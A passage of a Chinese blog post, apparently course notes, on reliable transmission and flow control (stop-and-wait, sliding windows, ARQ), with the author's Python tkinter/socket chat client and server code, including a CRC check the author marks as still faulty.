punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="https://blog.csdn.net/zc666ying/article/details/104444733">(29条消息) Python—多线程编程（一）线程的创建，管理，停止_onesalatree的博客-CSDN博客_python线程开始结束</a></p><p><a href="https://blog.csdn.net/wangyunhe5120/article/details/121846368">(29条消息) python GUI 多线程 暂停 恢复 结束_为此残生的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_41082014/article/details/92085252">(29条消息) Python多线程的退出控制_Messy..的博客-CSDN博客_python关闭线程的方法</a></p><p><a href="https://blog.csdn.net/qq_45956730/article/details/124120897">(29条消息) python多线程之 终止子线程_水w的博客-CSDN博客_python 结束线程</a></p></blockquote><h1 id="实训一阶段2：可靠传输"><a href="#实训一阶段2：可靠传输" class="headerlink" title="实训一阶段2：可靠传输"></a>实训一阶段2：可靠传输</h1><blockquote><p>要求：</p><p>了解聊天程序的一般原理；</p><p>按照带流量控制的协议改造聊天程序；</p><p>编程语言不限；</p><p>要能在两台PC上运行。</p></blockquote><h2 id="初级阶段5：可靠传输与流量控制"><a href="#初级阶段5：可靠传输与流量控制" class="headerlink" title="初级阶段5：可靠传输与流量控制"></a>初级阶段5：可靠传输与流量控制</h2><blockquote><p>可靠传输：使用<a href="https://zhuanlan.zhihu.com/p/405221648">差错检测技术</a>，接收方的数据链路层就可以检测出帧在传输过程中是否产生了误码。</p><p>如果可靠传输，能够在检测出误码之后，返回一个通知帧，告诉发送方之前传输的帧存在误码，也许可以解决误码重传的问题</p><ul><li>数据链路层传输差错：比特差错、分组丢失、分组失序、分组重复</li><li><strong>可靠传输</strong>：想方法实现<strong>发送端发送什么，接收端就收到什么</strong></li></ul></blockquote><p><img src="https://img-blog.csdnimg.cn/20210424181454154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1Nzc4Njc2,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>计算机网络之流量控制（停止-等待协议1:1、滑动窗口：后退N帧协议GBN、选择重传协议SR）、滑动窗口、可靠传输机制</strong></p><p>1.什么是<a href="https://so.csdn.net/so/search?q=%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6&spm=1001.2101.3001.7020">流量控制</a>？</p><ul><li>流量控制是数据链路层的一种功能，流量控制对数据链路上的帧的发送速率进行控制，以使接收方有足够的缓冲空间来接受每个帧</li><li>流量控制的基本方法是由接收方控制发送方发送数据的速率</li><li>常见的流量控制方式有两种：<code>停止-等待协议、滑动窗口协议</code></li></ul><p>2.什么是可靠传输机制？</p><ul><li><p>​        可靠传输机制是为了使数据可以正确稳定的传输和接收而制定的规则。</p></li><li><p>数据链路层的可靠传输通常使用确认和超时重传两种机制来完成。</p></li><li><p>确认是一种无数据的控制帧，这种控制帧使得接收方可以让发送方知道哪些内容被正确接收。有些情况下为了提高传输效率，将确认捎带在一个回复帧中，称为捎带确认。</p></li><li><p>超时重传是指发送方在发送某一个数据帧以后就开始一个计时器，在一定时间内如果没有得到发送的数据帧的确认帧，那么就重新发送该数据帧，直到发送成功为止。</p></li><li><p>自动重传请求（Auto Repeat reQuest，ARQ），通过接收方请求发送方重传出错的数据帧来恢复出错的帧，是通信中用于处理信道所带来差错的方法之一。</p></li><li><p>传统自动重传请求分为三种，即停等式（Stop-and-Wait）ARQ、后退N帧（Go-Back-N）ARQ以及选择性重传（Selective Repeat）ARQ。后两种协议是滑动窗口技术与请求重发技术的结合，由于窗口尺寸开到足够大，帧在线路上可以连续地流动，因此又称为连续ARQ协议。</p></li></ul><p>3.什么是滑动窗口机制？</p><ul><li>滑动窗口协议的基本原理就是在任意时刻，发送方都维持了一个连续的允许发送的帧的序号，称为发送窗口；同时，接收方也维持了一个连续的允许接收的帧的序号，称为接收窗口。</li><li>发送窗口和接收窗口的序号的上下界不一定要一样，甚至大小也可以不同。<br>不同的滑动窗口协议窗口大小一般不同。</li><li>发送方窗口内的序列号代表了那些已经被发送，但是还没有被确认的帧，或者是那些可以被发送的帧。</li></ul><p>PS：直接看王道考研-计算机网络 3.4</p><h3 id="0-6-1"><a href="#0-6-1" class="headerlink" title="0.6"></a><strong>0.6</strong></h3><p><strong>作用：CRC校验有问题，基础功能实现</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox <span class="token comment">#弹窗库</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> scrolledtext  <span class="token comment">#滚动文本框</span>server_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span>server_port <span class="token operator">=</span> <span class="token number">9999</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting......'</span><span class="token punctuation">)</span><span class="token comment">#登入窗口：输入呢称</span><span class="token keyword">def</span> <span class="token function">LoginWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · 登录'</span><span class="token punctuation">)</span> <span class="token comment">#窗口标题</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'300x150'</span><span class="token punctuation">)</span> <span class="token comment">#窗口大小</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span> <span class="token comment">#改变窗体位置（‘+横坐标+纵坐标’）</span>    nickname <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#昵称变量（对象）:在使用界面编程的时候，有些时候是需要跟踪变量的值的变化，以保证值的变更随时可以显示在界面上</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#将窗口大小设置为不可变</span>    <span class="token comment">#登录函数（检查用户名是否为空，以及长度）</span>    <span class="token keyword">def</span> <span class="token function">Login_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> nickname<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#????</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名为空！'</span><span class="token punctuation">)</span> <span class="token comment">#消息警告框</span>        <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名过长！最多为十个字符！'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_host<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 连接服务端，指定主机和端口</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 传递用户昵称</span>            ChatRoom<span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token comment"># 打开聊天窗口</span>    <span class="token comment">#登录按钮、输入提示标签、输入框</span>    Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>Login_in<span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">)</span>    Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'请输入昵称'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span>    Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span> textvariable<span class="token operator">=</span>nickname<span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#聊天窗口</span><span class="token keyword">def</span> <span class="token function">ChatRoom</span><span class="token punctuation">(</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'650x400'</span><span class="token punctuation">)</span>  <span class="token comment"># 窗口大小</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 将窗口大小设置为不可变</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span>  <span class="token comment"># 改变窗体位置（‘+横坐标+纵坐标’）</span>    <span class="token comment"># content = client.recv(2048).decode('utf-8')</span>    <span class="token comment"># if content != 'No message.':</span>    <span class="token comment">#     past_text = content + '\n------以上是历史消息------\n'</span>    <span class="token comment"># 从服务器端获取当前用户列表</span>    <span class="token comment"># UserList = []</span>    <span class="token comment"># UserList = client.recv(2048).decode('utf-8').split(',')</span>    <span class="token comment"># UserList.insert(0, '------当前用户列表------')</span>    <span class="token comment"># 窗口标题</span>    <span class="token comment"># nickname = UserList[len(UserList)-1]</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · '</span> <span class="token operator">+</span> nickname<span class="token punctuation">)</span>    <span class="token comment"># name_text = StringVar()</span>    <span class="token comment"># name_text.set(UserList)  # 用户列表文本设置</span>    <span class="token comment"># listbox1 = Listbox(root, listvariable=name_text)  # 用户列表，使用Listbox组件</span>    <span class="token comment"># listbox1.place(x=5, y=0, width=500, height=400)</span>    img_png <span class="token operator">=</span> PhotoImage<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'QQ图片20220901201640.png'</span><span class="token punctuation">)</span>    label_img <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> image<span class="token operator">=</span>img_png<span class="token punctuation">)</span>    label_img<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">350</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment">#聊天界面</span>    <span class="token comment"># content = client.recv(2048).decode('utf-8')</span>    ChatBox <span class="token operator">=</span> scrolledtext<span class="token punctuation">.</span>ScrolledText<span class="token punctuation">(</span>root<span class="token punctuation">)</span>  <span class="token comment"># 聊天信息窗口，使用ScrolledText组件制作</span>    ChatBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">470</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment"># ChatBox.pack()</span>    <span class="token comment"># ChatBox.insert('end',content)</span>    <span class="token keyword">def</span> <span class="token function">read_server</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token operator">+</span>content<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>see<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># ScrolledText组件方法，自动定位到结尾，否则只有消息在涨，窗口拖动条不动</span>            ChatBox<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 更新聊天信息窗口，显示新的信息</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#聊天输入框</span>    word <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>    word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    SentBox <span class="token operator">=</span> Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">140</span><span class="token punctuation">,</span>textvariable<span class="token operator">=</span>word<span class="token punctuation">)</span> <span class="token comment">#建一个输入框</span>    SentBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">305</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">475</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token comment">#设置大小和位置</span>    <span class="token comment">#发送按钮</span>    <span class="token keyword">def</span> <span class="token function">sendtext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> word<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获得文本内容</span>        <span class="token keyword">if</span> content<span class="token operator">==</span><span class="token string">'end'</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment">#用了一个标记记录点击的状态，不管内容是什么点了就变</span>    sendButton <span class="token operator">=</span> Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'发 送'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>sendtext<span class="token punctuation">)</span>    sendButton<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">490</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">308</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">150</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">85</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>LoginWindow<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">import</span> timehost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取当前主机的IP地址</span>port <span class="token operator">=</span> <span class="token number">9999</span> <span class="token comment">#设置防火墙开放端口</span>SocketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储客户端套接字的列表</span>TextList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储聊天记录</span>Nickname <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储用户呢称</span>cnt <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">#当前客户端人数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建server对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#监听</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器准备就绪！'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CRC</span><span class="token punctuation">(</span>crc<span class="token punctuation">,</span>poly<span class="token operator">=</span><span class="token string">'11001'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    test_crc <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>crc<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment">#将str类型转化成16进制</span>    poly_crc8 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>poly<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token comment"># print(test_crc,poly_crc8)</span>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> test_crc<span class="token operator">&amp;</span><span class="token number">0x800</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token comment">#最高位是否为1</span>            test_crc <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>            test_crc <span class="token operator">^</span><span class="token operator">=</span> poly_crc8        <span class="token keyword">else</span><span class="token punctuation">:</span>            test_crc <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>test_crc<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>test_crc<span class="token punctuation">)</span><span class="token comment">#接收一个客户端连接，及其发送来数据</span><span class="token keyword">def</span> <span class="token function">read_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#接受客户端发送来的数据</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token comment">#客户端异常，连接失败，则删除该socket</span>        <span class="token comment"># print(str(addr)+'已下线！')</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span>        SocketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        Nickname<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>        <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#多线程：将收到的消息发送给所有客户端</span><span class="token keyword">def</span> <span class="token function">send_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># s.send((','.join(Nickname)).encode('utf-8')) #将用户列表发送给各客户端</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> read_client<span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span> <span class="token comment">#客户端消息</span>            <span class="token keyword">if</span> content <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span> <span class="token comment">#如果没有结束循环</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment">#如果有将消息保存到历史记录</span>                <span class="token comment"># TextList.append(str(addr)+': '+content)</span>                TextList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span>            <span class="token comment">#将一个客户端发送过来的数据广播给其他客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> CRC<span class="token punctuation">(</span>content<span class="token punctuation">)</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Teacher: '</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># print(repr())</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'广播未成功！'</span><span class="token punctuation">)</span>QianYan <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'你好呀！今天我们一起来学习SW。'</span><span class="token punctuation">,</span>           <span class="token string">'可靠传输机制是为了使数据可以正确稳定的传输和接收而制定的规则。'</span><span class="token punctuation">,</span>           <span class="token string">'流量控制是数据链路层的一种功能，流量控制对数据链路上的帧的发送速率进行控制，以使接收方有足够的缓冲空间来接受每个帧。'</span><span class="token punctuation">,</span>           <span class="token string">'流量控制的基本方法是由接收方控制发送方发送数据的速率。'</span><span class="token punctuation">,</span>           <span class="token string">'常见的流量控制方式有两种：`停止-等待协议、滑动窗口协议'</span><span class="token punctuation">,</span>           <span class="token string">'那么，让我们开始体验停止-等待协议SW的魅力吧！'</span><span class="token punctuation">,</span>           <span class="token string">'\n\n请输入十六进制数据'</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    SocketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>    nickname <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token comment"># print(str(addr)+'已加入！')</span>    <span class="token keyword">if</span> nickname <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> nickname<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>                i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                nickname <span class="token operator">=</span> nickname <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">break</span>    Nickname<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> QianYan<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Teacher: '</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token 